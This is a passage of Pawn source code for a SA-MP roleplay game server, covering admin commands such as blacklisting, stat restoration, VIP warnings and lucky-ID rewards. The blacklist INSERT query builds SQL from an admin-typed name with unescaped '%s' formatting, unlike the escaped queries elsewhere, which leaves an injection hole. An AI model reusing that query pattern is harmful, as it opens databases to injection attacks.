		    	p_name[MAX_PLAYER_NAME],
		    	str[2048];

		    cache_get_data( rows, fields, mSQL );

		    format(str, sizeof(str), "{FFFFFF}Name\t{FFFFFF}Admin\t{FFFFFF}Stats\n");
		    if( rows )
			{
		        for( new i = 0; i < rows; i++ )
				{
		            agmstats = cache_get_field_content_int( i, "xAGMStats" );

		            CountStatistic += agmstats;
				}

				for( new i = 0; i < rows; i++ )
				{
		            admin_lvl = cache_get_field_content_int( i, "admin_lvl" );
		            agmstats = cache_get_field_content_int( i, "xAGMStats" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            new Float:postotak = floatmul(floatdiv(100, CountStatistic), agmstats);

		            format(str, sizeof(str), "%s{FFFFFF}%s\t{FFFFFF}A:%d\t{42F54E}%.2f%%\n", str, p_name, admin_lvl, postotak);
				}

				ShowPlayerDialog(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Admin Statistika:", str, "Zatvori", "");
		    }
		    else SendErrorMessage( playerid, "Nema Admina." );
		}
		case 1:
		{
		    new rows,
		    	fields,
		    	admin_lvl,
		    	agmstats,
		    	p_name[MAX_PLAYER_NAME],
		    	str[2048];

		    cache_get_data( rows, fields, mSQL );

		    format(str, sizeof(str), "{FFFFFF}Name\t{FFFFFF}GameMaster\t{FFFFFF}Stats\n");
		    if( rows )
			{
		        for( new i = 0; i < rows; i++ )
				{
		            agmstats = cache_get_field_content_int( i, "xAGMStats" );

		            CountStatistic += agmstats;
				}

				for( new i = 0; i < rows; i++ )
				{
		            admin_lvl = cache_get_field_content_int( i, "helper_level" );
		            agmstats = cache_get_field_content_int( i, "xAGMStats" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            new Float:postotak = floatmul(floatdiv(100, CountStatistic), agmstats);

		            format(str, sizeof(str), "%s{FFFFFF}%s\t{FFFFFF}GM:%d\t{42F54E}%.2f%%\n", str, p_name, admin_lvl, postotak);
				}

				ShowPlayerDialog(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}GameMaster Statistika:", str, "Zatvori", "");
		    }
		    else SendErrorMessage( playerid, "Nema GameMastera." );
		}
		case 2:
		{
		    new rows,
		    	fields,
		    	agmstats,
		    	p_name[MAX_PLAYER_NAME],
		    	str[2048];

		    cache_get_data( rows, fields, mSQL );

		    format(str, sizeof(str), "{FFFFFF}Name\t{FFFFFF}Stats\n");
		    if( rows )
			{
		        for( new i = 0; i < rows; i++ )
				{
		            agmstats = cache_get_field_content_int( i, "xAGMStats" );

		            CountStatistic += agmstats;
				}

				for( new i = 0; i < rows; i++ )
				{
		            agmstats = cache_get_field_content_int( i, "xAGMStats" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            new Float:postotak = floatmul(floatdiv(100, CountStatistic), agmstats);

		            format(str, sizeof(str), "%s{FFFFFF}%s\t{42F54E}%.2f%%\n", str, p_name, postotak);
				}

				ShowPlayerDialog(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Spec Admin Statistika:", str, "Zatvori", "");
		    }
		    else SendErrorMessage( playerid, "Nema Spec Admina." );
		}
	}
	return 1;
}

_:public addUserToBlackList(playerid, const ime[])
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( rows )
	{
	    SendErrorMessage( playerid, "To ime vec postoji na BL!" );
    }
    else
	{
		WriteLog("log-punishment", "Admin %s je doda%s ime '%s' na BL servera.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ime);
		AdminMsg(ADM_WARN, "[ADMIN] %s je doda%s ime '%s' na BL servera.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ime);

		static q[128];
		mysql_format(mSQL, q, sizeof(q), "INSERT INTO `blacklist` (`Time`, `Name`, `Admin`) VALUES (NOW(), '%s', '%s')", ime, ImeIgraca(playerid));
		mysql_tquery(mSQL, q);
	}
	return 1;
}

_:public removeUserFromBlackList(playerid, const ime[])
{
	new rows, fields;
	cache_get_data(rows, fields, mSQL);

	if(!rows)
	{
		SendErrorMessage(playerid, "Taj igrac ne postoji u bazi podataka!");
	}
	else
	{
		static q[128];
		mysql_format(mSQL, q, sizeof(q), "DELETE FROM `blacklist` WHERE `Name` = '%e' LIMIT 1", ime);
		mysql_tquery(mSQL, q);

		WriteLog("log-punishment", "Admin %s je obrisa%s ime '%s' sa BL servera.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ime);
		AdminMsg(ADM_WARN, "[ADMIN] %s je obrisa%s ime '%s' sa BL servera.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ime);
	}
	return 1;
}

IsCarInRangeOfPoint(vehicleid, Float:range, Float:x, Float:y, Float:z)
{
	new Float:px, Float:py, Float:pz;
 	GetVehiclePos(vehicleid, px, py, pz);
  	px -= x;
   	py -= y;
    pz -= z;
    return ((px * px) + (py * py) + (pz * pz)) < (range * range);
}

getCountryName(country)
{
	new name[20];
	name = "Other";

	switch(country)
	{
		case 1: name = "Makedonija";
		case 2: name = "Hrvatska";
		case 3: name = "Srbija";
		case 4: name = "Montenegro";
		case 5: name = "Bosna i Hercegovina";
		case 6: name = "Ostalo";
	}
	return name;
}

public OnPlayerClickPlayer( playerid, clickedplayerid, source )
{
	new string[200];
    format( string, sizeof( string ),
										"{4282C0}- Ime: {FFFFFF}%s\n\
										{4282C0}- Telefon: {FFFFFF}(%d)\n\
										{4282C0}- PacketLoss: {FFFFFF}(%.2f%)",
																				ImeIgraca( clickedplayerid ),
																				PlayerInfo[ clickedplayerid ][ xBrojTelefona ],
																				NetStats_PacketLossPercent(clickedplayerid) );
	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );
	return 1;
}

//============================================================================//
//================================[ Komande ]=================================//
//============================================================================//

CMD:server(playerid)
{
    if(PlayerInfo[playerid][xAdmin] >= 7)
	{
		if(!AdminDuty[playerid]) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti." );
		ShowPlayerDialog( playerid, dialog_SERVERMI, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																							"#\tOpcija\n\
																							{4282C0}(1).\t{FFFFFF}Upravljanje serverom\n\
																							{4282C0}(2).\t{FFFFFF}Napravi\n\
																							{4282C0}(3).\t{FFFFFF}Izbrisi\n\
																							{4282C0}(4).\t{FFFFFF}Izmeni\n\
																							{4282C0}(5).\t{FFFFFF}Spisak organizacija", "Odaberi", "Odustani" );
	}
	else return SendErrorMessage(playerid, "Niste u mogucnosti koristiti ovu komandu.");
	return 1;
}

CMD:offvratistats( playerid, const params[] )
{
	if( PlayerInfo[ playerid ][ xAdmin ] == 7  )
	{
		new levell, novac, imeigraca[ 24 ];
		if( sscanf( params, "s[24]ii", imeigraca, levell, novac ) ) return SendUsageMessage( playerid, "/offvratistats [Ime_Prezime] [level] [novac]");

        if( IsPlayerConnected( GetPlayerIdFromName( imeigraca ) ) ) return SendErrorMessage( playerid, "Taj igrac je online tako da vrati mu stats online.");

		if( levell < 0 || levell > 5 ) return SendErrorMessage( playerid, "Leveli se vracaju u rasponu od 0 do 5.");
		if( novac < 0 || novac > 3000000 ) return SendErrorMessage( playerid, "Novac se vraca u rasponu od 0$ do 3.000.000$.");

        new query[128];
		mysql_format( mSQL, query, sizeof(query), "SELECT `user_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", imeigraca );
		mysql_tquery( mSQL, query, "CheckPlayerOffVratiStats", "iisi", playerid, novac, imeigraca, levell );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

_:public CheckPlayerOffVratiStats( playerid, novac, const imeigraca[], levell)
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows ) 
    {
        SendErrorMessage( playerid, "Taj igrac ne postoji u bazi podataka!");
    }
    else {

        new user_id = cache_get_field_content_int( 0, "user_id" );

       	new q[ 150 ];
		mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `money` = money+'%d', `level` = level+'%d' WHERE `user_id` = '%d' LIMIT 1", novac, levell, user_id );
		mysql_tquery( mSQL, q );

		AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je vrati%s level %d, novac %d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), levell, novac, imeigraca);
		WriteLog("log-offvratistats", "Admin %s je vratio stats igracu %s(%d) | Level: %d, Novac: %d", ImeIgraca( playerid ), imeigraca, user_id, levell, novac);
    }
    return 1;
}

CMD:vratistats(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 5) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	new id, level, money;
	if(sscanf(params, "uii", id, level, money)) return SendUsageMessage(playerid, "/vratistats [id] [level] [novac]");

	if(id == INVALID_PLAYER_ID) return SendErrorMessage(playerid, "Taj ID nije ulogovan.");
	if(level > 15) return SendErrorMessage(playerid, "Level ne moze biti preko 15.");
	if(money > 3000000) return SendErrorMessage(playerid, "Novac ne moze biti preko 3,000,000$.");

 	PlayerInfo[ id ][ xLevel ] += level;
	SetPlayerScore( id, PlayerInfo[ id ][ xLevel ] );
	sql_user_update_integer( id, "level", PlayerInfo[ id ][ xLevel ] );

	DajIgracuNovac( id, money );

	SCMF( id, 0x33CCFFFF, "#VRACANJESTATSA: {FFFFFF}Admin {33CCFF}%s {FFFFFF}vam je vrati%s stats level {33CCFF}(%d) {FFFFFF}i {33CCFF}($%d).", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), level, money );
	SCMF( playerid, 0x33CCFFFF, "#VRACANJESTATSA: {FFFFFF}Vratili ste igracu stats {33CCFF}%s {FFFFFF}level {33CCFF}(%d) {FFFFFF}i {33CCFF}($%d).", ImeIgraca( id ), level, money );

 	AdminMsgForLevel(7, ADM_WARN, "[ADMIN] Admin %s je vratio %s stats level %d i $%d igracu %s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), level, money, ImeIgraca( id ));
	WriteLog("log-vratistats", "Admin %s je vratio %s stats level %d i $%d igracu %s.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), level, money, ImeIgraca(id));
	return 1;
}

CMD:settings(playerid)
{
	new str[550];
	format(str, sizeof(str), 
							"#\tOpcija\tOpis\n\
							{4282C0}(1).\t{E6CF7E}Password\t{FFFFFF}({E69F7E}************{FFFFFF})\n\
							{4282C0}(2).\t{E6CF7E}E-Mail\t{FFFFFF}({E69F7E}%s{FFFFFF})\n\
							{4282C0}(3).\t{E6CF7E}Godine\t{FFFFFF}({E69F7E}%d{FFFFFF})\n\
							{4282C0}(4).\t{E6CF7E}Spol\t{FFFFFF}({E69F7E}%s{FFFFFF})\n\
							{4282C0}(5).\t{E6CF7E}Drzava\t{FFFFFF}({E69F7E}%s{FFFFFF})\n\
							{4282C0}(6).\t{E6CF7E}Spawn\t-\n\
							{4282C0}(7).\t{E6CF7E}TextDraws\t-",
																PlayerInfo[playerid][xMail],
																PlayerInfo[playerid][xGodine],
																(PlayerInfo[playerid][xPol] == 1 ? "Muski" : "Zenski"),
																getCountryName(PlayerInfo[playerid][xDrzava]));
	ShowPlayerDialog(playerid, dialog_SETTINGS, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV, str, "Odaberi", "Odustani");
	return 1;
}

CMD:govattachs(playerid)
{
	if(GetFactionType(playerid) != ORG_TIP_VLADINA) return SendErrorMessage(playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste na nogama.");

	ShowPlayerDialog(playerid, dialog_GOVATTACHS, DIALOG_STYLE_LIST, "{FFFFFF}GOV Attachs:", 
																							"{4282C0}(1). {FFFFFF}Armour/Vest\n\
																							{4282C0}(2). {FFFFFF}Hat/Cap/Helmet\n\
																							{4282C0}(3). {FFFFFF}Radio\n\
																							{4282C0}(4). {FFFFFF}RIOT Shield", "Odaberi", "Odustani");
	return 1;
}

CMD:carsign(playerid, const params[]) 
{
    if(GetFactionType(playerid) != ORG_TIP_VLADINA) return SendErrorMessage(playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if(PoliceDuty[playerid] == false) return SendErrorMessage(playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");
    if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Niste u vozilu.");

    new tekst[10];
	if(sscanf(params, "s[10]", tekst)) return SendUsageMessage(playerid, "/carsign [text]");
	if(strlen(tekst) < 1 || strlen(tekst) > 10) return SendErrorMessage(playerid, "Sign ne moze biti manji od 1 ili veci od 10 karaktera.");

	new vehicleid = GetPlayerVehicleID(playerid);
	if(VehicleInfo[vehicleid][vUsage] == ORGANIZACIJSKO_VOZILO && VehicleInfo[vehicleid][vOrganization] == PlayerInfo[playerid][xClan]) 
	{
	    if(CarSign[vehicleid] == 0) 
	    {
			CarSign[vehicleid] = 1;
			SCMF(playerid, 0xFFFF00FF, "(SIGN): Stavili ste oznaku {FFFFFF}%s {FFFF00}na vozilo.", tekst);

		    vehicle3Dtext[vehicleid] = CreateDynamic3DTextLabel(tekst, 0xFFFFFFC8, 0.0, 0.0, -100.0, 7.0, INVALID_PLAYER_ID, vehicleid, 0, -1, -1, -1, 7.0, -1, 0);
		    Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, vehicle3Dtext[vehicleid], E_STREAMER_ATTACH_OFFSET_X, -0.800000);
		    Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, vehicle3Dtext[vehicleid], E_STREAMER_ATTACH_OFFSET_Y, -2.899999);
		    Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, vehicle3Dtext[vehicleid], E_STREAMER_ATTACH_OFFSET_Z, -0.100000);
		}
		else
		{
			SendClientMessage(playerid, 0xFFFF00FF, "(SING): Skinuli ste oznaku sa vozila.");
			DestroyDynamic3DTextLabel(vehicle3Dtext[vehicleid]);
			CarSign[vehicleid] = 0;
		}
	} 
	else SendErrorMessage(playerid, "Da bi koristili ovu komandu morate biti u vozilu PD/SD.");
	return 1;
}

CMD:paket(playerid)
{
	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA )
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, PaketNewPos[0], PaketNewPos[1], PaketNewPos[2]))
		{
			if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) && ServerInfo[ PaketVreme ] == 0 )
			{
				new OrgID = PlayerInfo[ playerid ][ xClan ];

	            DestroyDynamicObject( ServerInfo[ PaketObject ] );
				SetPlayerAttachedObject( playerid, OBJECT_SLOT_MAIN, 328, 6, 0.00, 0.00, 0.00, 0.0, 0.0, 0.0, 1.31, 1.28, 1.00 );
				IgracNosiPaket[ playerid ] = true;
				ServerInfo[ PaketNijeNaSvomMestu ] = true;
				ServerInfo[ PaketVreme ] = 0;

				if( org_info[ OrgID ][ oEntFromBussines ] != -1 )
				{
		        	new bussines_id = org_info[ OrgID ][ oEntFromBussines ];
		        	SMG_SetPlayerCheckpoint( playerid, BusinessInfo[ bussines_id ][ bEnterX ], BusinessInfo[ bussines_id ][ bEnterY ], BusinessInfo[ bussines_id ][ bEnterZ ], 2.0 );
		        }
				else
				{
					SMG_SetPlayerCheckpoint( playerid, org_info[ OrgID ][ oPozExtX ], org_info[ OrgID ][ oPozExtY ], org_info[ OrgID ][ oPozExtZ ], 2.0 );
				}
				CheckpointStatus[ playerid ] = 7;

	            foreach( new i : Player)
				{
	                if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 )
					{
						SCMF( i, ZUTA, "(PAKET): {FFFFFF}%s(%s) {FFFF00}je pokupio paket pokusajte ga pronaci i uzeti mu paket.", ImeIgraca( playerid ), org_info[ OrgID ][ oPreFix ] );
					}
				}
				KillTimer(ServerInfo[ PaketTimer ]);
			}
			else SendErrorMessage(playerid, "Paket nije kreiran / paket mozete pokupiti za par sekundi.");
		}
		else SendErrorMessage(playerid, "Niste blizu paketa.");
	}
	return 1;
}

CMD:tiki(playerid)
{
	if(TikiData[tPokupljen] == true) return SendErrorMessage(playerid, "Tiki je vec pronadjen ili nije kreiran.");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, TikiData[tPosX], TikiData[tPosY], TikiData[tPosZ])) return SendErrorMessage(playerid, "Ne nalazite se blizu Tiki-a.");

	new sati, minuta, sekundi;
    gettime(sati, minuta, sekundi);
    SendClientMessageToAllEx(0x009113FF, "(TIKI): {FFFFFF}%s {009113}je pronasa%s Tiki-a, sledeci u {FFFFFF}(%dh).", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), sati+1);
    
    TikiData[tPokupljen] = true;
    if(IsValidDynamicObject(TikiData[tObject])) DestroyDynamicObject(TikiData[tObject]);
    if(IsValidDynamic3DTextLabel(TikiData[t3D])) DestroyDynamic3DTextLabel(TikiData[t3D]);
    
    PlayerInfo[playerid][xTiki]++;

    if(PlayerInfo[playerid][xTiki] >= 50)
    {
        PlayerInfo[playerid][xUPoen]++;
		PlayerInfo[playerid][xTiki] = 0;
		SendClientMessage(playerid, 0x009113FF, "(TIKI): Dobili ste +1 U-Poen zbog {FFFFFF}(50) {009113}Tiki-a.");
    }
    static string[144];
	mysql_format(mSQL, string, sizeof(string), "UPDATE `users` SET `xTiki` = '%d', `xUPoen` = '%d' WHERE `user_id` = '%d'", PlayerInfo[playerid][xTiki], PlayerInfo[playerid][xUPoen], PlayerInfo[playerid][xID]);
	mysql_tquery(mSQL, string);
	return 1;
}

CMD:sretniid(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 4) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new nagrada, kolicina;
	if(sscanf(params, "ii", nagrada, kolicina)) return SendUsageMessage(playerid, "/sretniid [1: money | 2: level | 3: zlato | 4: custom] [kolicina]");
	if(nagrada < 1 || nagrada > 4) return SendErrorMessage(playerid, "Pogresan ID nagrade.");

	new const sretniid = Iter_Random(Player);
	switch(nagrada)
	{
		case 1:
		{
			if(kolicina < 1 || kolicina > 100000) return SendErrorMessage(playerid, "Ne mozete ispod 1$ i preko 100.000$.");

			SendClientMessageToAllEx(0x26FF79FF, "#SRETNI-ID: %s[%d] {FFFFFF}je izvuk%s sretni ID, {26FF79}%s[%d] {FFFFFF}>> {26FF79}$%d", ImeIgraca(playerid), playerid, getPolForString(playerid, "ao", "la"), ImeIgraca(sretniid), sretniid, kolicina);
			DajIgracuNovac(sretniid, kolicina);

			WriteLog("log-sretniid", "%s je izvuk%s sretni id %s[%d], nagrada: $%d", ImeIgraca(playerid), getPolForString(playerid, "ao", "la"), ImeIgraca(sretniid), sretniid, kolicina);
		}
		case 2:
		{
			if(kolicina < 1 || kolicina > 5) return SendErrorMessage(playerid, "Ne mozete ispod 1 i preko 5 levela.");

			SendClientMessageToAllEx(0x26FF79FF, "#SRETNI-ID: %s[%d] {FFFFFF}je izvuk%s sretni ID, {26FF79}%s[%d] {FFFFFF}>> {26FF79}%d x LevelUP", ImeIgraca(playerid), playerid, getPolForString(playerid, "ao", "la"), ImeIgraca(sretniid), sretniid, kolicina);
			
			PlayerInfo[sretniid][xLevel] += kolicina;
			sql_user_update_integer(sretniid, "level", PlayerInfo[sretniid][xLevel]);
			SetPlayerScore(sretniid, PlayerInfo[sretniid][xLevel]);
			
			WriteLog("log-sretniid", "%s je izvuk%s sretni id %s[%d], nagrada: %d x LevelUP", ImeIgraca(playerid), getPolForString(playerid, "ao", "la"), ImeIgraca(sretniid), sretniid, kolicina);
		}
		case 3:
		{
			if(kolicina < 1 || kolicina > 1000) return SendErrorMessage(playerid, "Ne mozete ispod 1 i preko 1000G.");

			SendClientMessageToAllEx(0x26FF79FF, "#SRETNI-ID: %s[%d] {FFFFFF}je izvuka%s sretni ID, {26FF79}%s[%d] {FFFFFF}>> {26FF79}%dG zlata", ImeIgraca(playerid), playerid, getPolForString(playerid, "o", "la"), ImeIgraca(sretniid), sretniid, kolicina);
			
			PlayerInfo[sretniid][xZlato] += kolicina;
			sql_user_update_integer(sretniid, "xZlato", PlayerInfo[sretniid][xZlato]);
			
			WriteLog("log-sretniid", "%s je izvuka%s sretni id %s[%d], nagrada: %dG zlata", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), ImeIgraca(sretniid), sretniid, kolicina);
		}
		case 4:
		{
			SendClientMessageToAllEx(0x26FF79FF, "#SRETNI-ID: %s[%d] {FFFFFF}je izvuk%s sretni ID, {26FF79}%s[%d] {FFFFFF}>> {26FF79}Custom", ImeIgraca(playerid), playerid, getPolForString(playerid, "ao", "la"), ImeIgraca(sretniid), sretniid);
			WriteLog("log-sretniid", "%s je izvuk%s sretni id %s[%d], nagrada: Custom", ImeIgraca(playerid), getPolForString(playerid, "ao", "la"), ImeIgraca(sretniid), sretniid);
		}
	}
	return 1;
}

CMD:rtcradius(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new Float:radius;
	if(sscanf(params, "f", radius)) return SendUsageMessage(playerid, "/rtcradius [radius]");
	if(radius < 1.0 || radius > 200.0) return SendErrorMessage(playerid, "Ne mozete ispod 1 i preko 200m.");

	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);

	for(new vid, vall = GetVehiclePoolSize(); vid <= vall; vid++)
	{
		if(IsCarInRangeOfPoint(vid, radius, X, Y, Z) && IsVehicleEmpty(vid)) SetVehicleToRespawn(vid);
	}
	DodajWarnRed("~y~(RTC-RADIUS) %s ~w~je respawnova%s vozila u radiusu od ~y~%.1fm.", ImeIgraca(playerid), getPolForString(playerid, "o", "la"), radius);
	SCMF(playerid, 0xFFFF00FF, "#RTC-RADIUS: {FFFFFF}Respawnovali ste sva vozila u radiusu od {FFFF00}%.1fm", radius);
	return 1;
}

CMD:aregistercar(playerid, const params[])
{
    if(PlayerInfo[playerid][xAdmin] != 7 || !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid, "Niste ovlasceni.");

    new izbor = GetPlayerVehicleID(playerid);

    new Float:x, Float:y, Float:z;
    GetVehiclePos( izbor, x, y, z );
    if( !IsPlayerInRangeOfPoint( playerid, 7.0, x, y, z ) ) return SendErrorMessage( playerid, "Nisi u blizini auta.");
    if(!IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Moras biti unutar auta!" );

    VehicleInfo[ izbor ][ vTeh ] = 0;
    VehicleInfo[ izbor ][ vRegVreme ] = 999;

    strmid( VehicleInfo[ izbor ][ vTablice ], "69", 0, strlen( "69" ), 32 );

    new q[ 156 ];
    mysql_format( mSQL, q, sizeof(q), "UPDATE vehicles SET v_teh = '%d', v_reg = '%d', v_reg_vreme = '%d', v_tablice = '%e' WHERE veh_id = '%d' LIMIT 1",
                                VehicleInfo[ izbor ][ vTeh ],
                                VehicleInfo[ izbor ][ vReg ],
                                VehicleInfo[ izbor ][ vRegVreme ],
                                VehicleInfo[ izbor ][ vTablice ],
                                VehicleInfo[ izbor ][ vSqlID ] );
    mysql_tquery( mSQL, q );

    SetPlayerTimerEx(playerid, "Postaviotable", 5000, false, "ii", playerid, izbor);
    return 1;
}

CMD:blacklist(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 4) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new ime[24];
	if(sscanf(params, "s[24]", ime)) return SendUsageMessage(playerid, "/blacklist [Ime_Prezime]");
	if(strlen(ime) < 3 || strlen(ime) > MAX_PLAYER_NAME) return SendErrorMessage(playerid, "Ime ne moze biti ispod 3 i preko %d karaktera", MAX_PLAYER_NAME);
	if(!strcmp(ime, "Saco") || !strcmp(ime, "Ghetoven") || !strcmp(ime, "Kristijan") || !strcmp(ime, "Carl") || !strcmp(ime, ".momenzi")) return SendErrorMessage(playerid, "Ni ne pokusavaj njih.");

	new q[128];
	mysql_format(mSQL, q, sizeof(q), "SELECT `Name` FROM `blacklist` WHERE `Name` = '%e' LIMIT 1", ime);
	mysql_tquery(mSQL, q, "addUserToBlackList", "is", playerid, ime);
	return 1;
}

CMD:rblacklist(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 4) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new ime[24];
	if(sscanf(params, "s[24]", ime)) return SendUsageMessage(playerid, "/rblacklist [Ime_Prezime]");
	if(strlen(ime) < 3 || strlen(ime) > MAX_PLAYER_NAME) return SendErrorMessage(playerid, "Ime ne moze biti ispod 3 i preko %d karaktera", MAX_PLAYER_NAME);

	new q[128];
	mysql_format(mSQL, q, sizeof(q), "SELECT `Name` FROM `blacklist` WHERE `Name` = '%e' LIMIT 1", ime);
	mysql_tquery(mSQL, q, "removeUserFromBlackList", "is", playerid, ime);
	return 1;
}

CMD:vipwarn(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new id;
	if(sscanf(params, "r", id)) return SendUsageMessage(playerid, "/vipwarn [id/name]");
	if(id == INVALID_PLAYER_ID) return SendErrorMessage(playerid, "ID/Ime nije konektovano.");
	if(id == playerid) return SendErrorMessage(playerid, "Nemoj sam/a sebi.");
	if(PlayerInfo[id][xVIPLevel] == 0) return SendErrorMessage(playerid, "Samo VIPovima mozes dati VIP warn.");

	PlayerInfo[id][xVIPWarn]++;
	SCMF(id, 0xFF6347FF, "#VIPWARN: {FFFFFF}Admin {FF6347}%s {FFFFFF}vam je dao VIP warn, {FF6347}[%d/3].", ImeIgraca(playerid), PlayerInfo[id][xVIPWarn]);
	SCMF(playerid, 0xFF6347FF, "#VIPWARN: {FFFFFF}Igracu {FF6347}%s {FFFFFF}dali ste VIP warn, {FF6347}[%d/3].", ImeIgraca(id), PlayerInfo[id][xVIPWarn]);
	AdminMsg(ADM_WARN, "[ADMIN] %s[%d] je da%s igracu %s[%d] VIP warn (%d/3).", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", ImeIgraca(id), id, PlayerInfo[id][xVIPWarn]);
	WriteLog("log-warn", "Admin %s je dao/la %s VIP warn (%d/3)", ImeIgraca( playerid ), ImeIgraca(id), PlayerInfo[id][xVIPWarn]);
	sql_user_update_integer(id, "xVIPWarn", PlayerInfo[id][xVIPWarn]);

	if(PlayerInfo[id][xVIPWarn] >= 3)
	{
		PlayerInfo[id][xVIPWarn] = 0;
		PlayerInfo[id][xVIPLevel] = 0;

		SCMF(id, 0xFF6347FF, "#VIPWARN: {FFFFFF}Zbog dostignutog broja VIP warnova od {FF6347}[%d/3] {FFFFFF}izgubili ste VIP privilegije.", PlayerInfo[id][xVIPWarn]);

		static q[128];
		mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `vip_level` = '0', `xVIPWarn` = '0' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[id][xID]);
		mysql_tquery(mSQL, q);
	}
	return 1;
}

CMD:rvipwarn(playerid, const params[])
{
    if(PlayerInfo[playerid][xAdmin] < 3) return SendErrorMessage(playerid, "Niste ovlasceni.");

    new id;
    if(sscanf(params, "r", id)) return SendUsageMessage(playerid, "/rvipwarn [id/name]");
    if(id == INVALID_PLAYER_ID) return SendErrorMessage(playerid, "ID/Ime nije konektovano.");
    if(id == playerid) return SendErrorMessage(playerid, "Nemoj sam/a sebi.");
    if(PlayerInfo[id][xVIPWarn] == 0) return SendErrorMessage(playerid, "Igrac nema vip-warnova.");

    PlayerInfo[id][xVIPWarn]--;
    SCMF(id, 0xFF6347FF, "#VIPWARN: {FFFFFF}Admin {FF6347}%s {FFFFFF}vam je skinuo VIP warn, {FF6347}[%d/3].", ImeIgraca(playerid), PlayerInfo[id][xVIPWarn]);
    SCMF(playerid, 0xFF6347FF, "#VIPWARN: {FFFFFF}Igracu {FF6347}%s {FFFFFF}skinuli ste VIP warn, {FF6347}[%d/3].", ImeIgraca(id), PlayerInfo[id][xVIPWarn]);
    AdminMsg(ADM_WARN, "[ADMIN] %s[%d] je skinu%s igracu %s[%d] VIP warn (%d/3).", ImeIgraca(playerid), playerid, PlayerInfo[playerid][xPol] == 1 ? "o" : "la", ImeIgraca(id), id, PlayerInfo[id][xVIPWarn]);
    WriteLog("log-warn", "Admin %s je skinuo/la %s VIP warn (%d/3)", ImeIgraca(playerid), ImeIgraca(id), PlayerInfo[id][xVIPWarn]);

    sql_user_update_integer(id, "xVIPWarn", PlayerInfo[id][xVIPWarn]);

    if(PlayerInfo[id][xVIPWarn] == 0)
    {
        SendClientMessage(id, 0xFF6347FF, "#VIPWARN: {FFFFFF}Ocisceni ste od VIP warnova, za sljedeci put pazite kako koristite VIP privilegije.");
    }
    return 1;
}

CMD:oglaswarn(playerid, const params[])
{
	if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSpecAdmin] < 1) return SendErrorMessage(playerid, "Niste ovlasceni.");

	new id;
	if(sscanf(params, "r", id)) return SendUsageMessage(playerid, "/oglaswarn [id/name]");
	if(id == INVALID_PLAYER_ID) return SendErrorMessage(playerid, "ID/Ime nije konektovano.");
	if(id == playerid) return SendErrorMessage(playerid, "Nemoj sam/a sebi.");
	if(PlayerInfo[id][xOglasWarn] >= 3) return SendErrorMessage(playerid, "Igrac je vec oglas-banovan.");

	PlayerInfo[id][xOglasWarn]++;
